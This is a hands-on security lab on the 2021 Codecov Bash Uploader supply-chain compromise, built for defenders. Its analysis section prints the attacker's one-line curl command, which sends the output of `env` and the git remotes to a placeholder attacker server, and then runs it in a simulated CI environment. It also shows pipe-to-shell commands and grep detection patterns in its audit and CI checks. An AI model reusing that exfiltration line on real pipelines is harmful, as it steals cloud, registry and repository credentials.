# Lab 6.7: Case Study -- Codecov Bash Uploader

<div class="lab-meta">
  <span>~30 minutes</span>
  <span>Intermediate</span>
  <span>Prerequisites: <a href="../../tier-2/2.4-secret-exfiltration/">Lab 2.4</a></span>
</div>

On April 1, 2021, Codecov disclosed that their Bash Uploader script -- used by thousands of CI/CD pipelines to submit code coverage reports -- had been modified by an attacker. The compromised script exfiltrated every environment variable from the CI runner, including AWS keys, GitHub tokens, Docker registry credentials, and database passwords. The attack persisted undetected for over two months.

The attack exploited a simple but devastating pattern: `curl https://codecov.io/bash | bash`. Thousands of organizations piped an external script directly into their shell, trusting that the content would not change. When it did change, every CI pipeline that used it became an exfiltration channel for secrets. The Codecov incident is the canonical example of why `curl | bash` is dangerous in CI/CD and why external scripts must be pinned by hash.

### Step 2: How the uploader was used

```bash
# The typical CI integration looked like this:
cat /app/ci-pipeline/workflow-before.yml
```

The standard integration was a single line in the CI workflow:

```bash
curl -s https://codecov.io/bash | bash
```

This downloads the uploader script at build time and executes it immediately. The script collects code coverage data and uploads it to Codecov's service. It runs with full access to the CI environment, including all environment variables and secrets.

### Step 3: Why organizations used curl | bash

```bash
echo "
Why curl|bash was popular for CI integrations:
1. One-line setup -- simple to add to any CI system
2. Always up-to-date -- no need to manage a local copy
3. Vendor-recommended -- Codecov's own documentation used this pattern
4. No dependencies -- does not require installing a package or action
5. Cross-platform -- works on any CI system with curl and bash
"
```

### Step 4: Understand the trust assumptions

```bash
# What permissions does the CI environment have?
cat /app/ci-pipeline/env-example.txt
```

CI environments are rich with secrets:

- `GITHUB_TOKEN` -- repository write access
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` -- cloud account credentials
- `DOCKER_PASSWORD` -- container registry push access
- `NPM_TOKEN` -- package publishing credentials
- `DATABASE_URL` -- production database connection strings

The Bash Uploader script had access to ALL of these because it ran in the same shell environment as the rest of the CI pipeline.

!!! warning "Phase 2: ANALYZE -- The Modified Uploader Script"

    **Goal:** Walk through how the attacker modified the uploader script to exfiltrate CI environment variables.

### Step 1: Compare legitimate vs. compromised scripts

```bash
diff /app/uploader/legitimate-uploader.sh /app/uploader/compromised-uploader.sh
```

The attacker added a single line to the uploader script. At the end of the coverage upload function, the modified script executed:

```bash
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
    http://<attacker-server>/upload/v2 || true
```

### Step 2: Understand the exfiltration line

```bash
cat /app/analysis/exfil-breakdown.txt
```

Breaking down the exfiltration command:

- `curl -sm 0.5` -- silent mode, 0.5 second timeout (fast, minimizes detection)
- `-d "$(git remote -v)"` -- sends the git remote URLs (identifies the repository)
- `<<<<<< ENV $(env)` -- sends ALL environment variables (the secrets payload)
- `http://<attacker-server>/upload/v2` -- attacker's collection server
- `|| true` -- suppresses errors so the CI pipeline continues normally

### Step 3: See the exfiltration in action

```bash
# Run the compromised uploader in a simulated CI environment
export GITHUB_TOKEN="ghp_SIMULATED_TOKEN_12345"
export AWS_ACCESS_KEY_ID="AKIA_SIMULATED_KEY"
export AWS_SECRET_ACCESS_KEY="SIMULATED_SECRET_KEY_XXXXX"
export NPM_TOKEN="npm_SIMULATED_TOKEN_67890"

# Execute the compromised uploader
bash /app/uploader/compromised-uploader.sh

# Check what the attacker received
curl -s http://exfil-server:8080/collected | python3 -m json.tool
```

Every environment variable was exfiltrated. The CI pipeline showed "Coverage uploaded successfully" -- nothing looked wrong.

### Step 4: How the attacker gained access

```bash
cat /app/analysis/access-vector.txt
```

Codecov's investigation determined that the attacker exploited an error in Codecov's Docker image creation process. A credential was leaked that allowed the attacker to modify the Bash Uploader script hosted on `codecov.io`. The script was served from Codecov's CDN, so modifying it affected all users immediately.

!!! success "Phase 3: LESSONS -- Eliminating curl | bash"

    **Goal:** Replace `curl | bash` patterns with pinned, verified alternatives that are immune to upstream modification.

### Lesson 1: Pin scripts by hash

```bash
cat > /app/defenses/pinned-uploader.sh << 'SHELLEOF'
#!/bin/bash
# Download and verify the Codecov uploader by hash
EXPECTED_SHA="d6aa3207c4908d123bd8af62ec0538e3f2b9f257c3de62fad4e29cd3b59b41d9"
UPLOADER_URL="https://uploader.codecov.io/v0.1.0_5124/linux/codecov"

curl -fsSL "$UPLOADER_URL" -o /tmp/codecov
ACTUAL_SHA=$(sha256sum /tmp/codecov | awk '{print $1}')

if [ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]; then
    echo "ERROR: Codecov uploader hash mismatch!"
    echo "  Expected: $EXPECTED_SHA"
    echo "  Got:      $ACTUAL_SHA"
    echo "The script may have been modified. Aborting."
    exit 1
fi

chmod +x /tmp/codecov
/tmp/codecov upload
SHELLEOF
chmod +x /app/defenses/pinned-uploader.sh
```

### Lesson 2: Use verified GitHub Actions instead of scripts

```bash
cat > /app/defenses/workflow-after.yml << 'YMLEOF'
name: Tests with Coverage

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run tests with coverage
        run: pytest --cov=. --cov-report=xml

      # BEFORE (vulnerable):
      # - name: Upload coverage
      #   run: curl -s https://codecov.io/bash | bash

      # AFTER (verified):
      - name: Upload coverage
        uses: codecov/codecov-action@v4  # Pinned to tag
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          files: coverage.xml
          fail_ci_if_error: true
YMLEOF
```

GitHub Actions are fetched from a specific tag/commit and their integrity is verified by GitHub. This is safer than downloading a script at build time.

### Lesson 3: Restrict CI environment variable access

```bash
cat > /app/defenses/restricted-workflow.yml << 'YMLEOF'
name: Tests with Minimal Secrets

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    # Only expose secrets that this job actually needs
    environment: testing
    permissions:
      contents: read  # Minimal permissions
    steps:
      - uses: actions/checkout@v4

      - name: Run tests
        run: pytest --cov=.
        # No secrets in environment -- tests don't need them

      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          token: ${{ secrets.CODECOV_TOKEN }}  # Only this secret is available
          files: coverage.xml
YMLEOF
```

### Lesson 4: Audit and eliminate all curl | bash patterns

```bash
# Find all curl|bash patterns in CI configurations
cat > /app/defenses/audit-curl-bash.sh << 'SHELLEOF'
#!/bin/bash
echo "=== Scanning for curl|bash patterns ==="
FOUND=0
for f in $(find /app -name "*.yml" -o -name "*.yaml" -o -name "Makefile" -o -name "*.sh"); do
    if grep -Pn 'curl.*\|\s*(ba)?sh|wget.*\|\s*(ba)?sh|curl.*\|\s*python|pipe.*bash' "$f" 2>/dev/null; then
        echo "  FOUND in: $f"
        FOUND=$((FOUND + 1))
    fi
done
if [ "$FOUND" -gt 0 ]; then
    echo "ALERT: Found $FOUND file(s) with curl|bash patterns."
else
    echo "CLEAN: No curl|bash patterns found."
fi
SHELLEOF
chmod +x /app/defenses/audit-curl-bash.sh
/app/defenses/audit-curl-bash.sh
```

!!! danger "Phase 4: DETECT -- Identifying Script Modification and Secret Exfiltration"

    **Goal:** Detect when external scripts are modified or when CI environments are exfiltrating secrets.

### SIEM / Log Indicators

The Codecov attack was detectable through **outbound HTTP POST from CI runners to unexpected endpoints** and **downloaded scripts with different hashes than expected**. The core signal is data exfiltration from the CI environment.

**What to look for:**

- CI runners making HTTP POST requests to endpoints outside the approved list (Codecov, GitHub, your own infrastructure)
- `curl | bash` or `wget | bash` commands in CI logs
- Downloaded scripts with SHA256 hashes that differ from pinned values
- Large HTTP POST bodies from CI runners (environment variable dump)
- CI secrets being accessed by steps that do not need them

### Network Indicators

| Indicator | What It Means |
|-----------|---------------|
| HTTP POST from CI runner to unknown IP with body >1KB | CI environment variables being exfiltrated |
| DNS query from CI runner to unfamiliar domain | Downloaded script reaching out to attacker C2 |
| HTTPS to codecov.io with response body different from cached hash | Uploader script modified at source |

### EDR / Process Indicators

- `curl` or `wget` piped directly to `bash` or `sh` in CI runner process trees
- `env` command executed and output piped to `curl` POST
- Processes spawned by CI runners making outbound HTTP calls not related to the build
- Script files in `/tmp` with contents differing from expected hash

| Technique | ID | Relevance |
|-----------|-----|-----------|

!!! tip "SOC Relevance"

    **Alert you will see:** "CI runner making outbound POST to unapproved endpoint" or "Downloaded CI script hash mismatch"

    The Codecov attack affected thousands of organizations because `curl | bash` was the vendor-recommended integration method. This pattern trades security for convenience: the script is always up-to-date, but the user has zero control over what it does. When the script was modified, every CI pipeline that used it became an exfiltration channel immediately -- no PR needed, no code review, no deployment.

    **Triage steps:**

    1. Check if your CI pipelines use `curl | bash` or `wget | bash` patterns -- search all workflow files
    2. If the script was downloaded from a compromised source: assume all CI environment variables from the exposure window are compromised
    3. Rotate ALL secrets that were available in the CI environment: AWS keys, tokens, passwords, database credentials
    4. Check CI logs for outbound HTTP POST to unfamiliar endpoints during the exposure window
    5. Audit downstream systems: did the attacker use stolen credentials to access cloud resources, push code, or publish packages?

    **False positive rate:** Low for hash mismatches. Medium for outbound POST from CI runners (some legitimate integrations make HTTP calls).

!!! example "CI Integration"

    Eliminate `curl | bash` and enforce script hash verification.

    **`.github/workflows/no-curl-bash.yml`:**

    ```yaml
    name: CI Security -- No curl|bash

    on:
      pull_request:
        paths:
          - ".github/workflows/**"
          - "Makefile"
          - "scripts/**"

    jobs:
      check-curl-bash:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4

          - name: Reject curl|bash patterns
            run: |
              echo "--- Scanning for curl|bash anti-patterns ---"
              FOUND=0
              PATTERNS='curl.*\|\s*(ba)?sh|wget.*\|\s*(ba)?sh|curl.*\|\s*python'
              for f in $(find . -name "*.yml" -o -name "*.yaml" -o -name "*.sh" \
                         -o -name "Makefile" -o -name "Dockerfile" | grep -v node_modules); do
                if grep -Pn "$PATTERNS" "$f" 2>/dev/null; then
                  echo "::error file=$f::Found curl|bash pattern. Download scripts, verify by hash, then execute."
                  FOUND=1
                fi
              done
              if [ "$FOUND" -eq 1 ]; then
                exit 1
              fi
              echo "PASS: No curl|bash patterns found."

          - name: Verify pinned script hashes
            run: |
              # If scripts are downloaded in CI, they must have hash verification
              for f in $(find .github/workflows -name "*.yml"); do
                if grep -q "curl.*-o\|wget.*-O" "$f"; then
                  if ! grep -A 3 "curl.*-o\|wget.*-O" "$f" | grep -q "sha256sum\|shasum\|checksum"; then
                    echo "::warning file=$f::Script download without hash verification detected."
                  fi
                fi
              done
              echo "PASS: Script hash verification check complete."
    ```

## What You Learned

1. **`curl | bash` is a supply chain attack waiting to happen** -- it downloads and executes code with no verification, no pinning, and no visibility into changes at the source.
2. **CI environments are treasure troves of secrets** -- a single exfiltration line captures AWS keys, tokens, passwords, and everything else stored in environment variables.
3. **Two months of undetected exfiltration** -- the Codecov attack persisted from January 31 to April 1, 2021. Every CI run during that window exfiltrated secrets silently.
4. **Pin scripts by hash, not by URL** -- downloading a script and verifying its SHA256 hash before execution ensures that modifications at the source are detected.
5. **Prefer verified GitHub Actions over external scripts** -- GitHub Actions are fetched by tag/commit from a repository with integrity guarantees, unlike scripts served from a CDN.
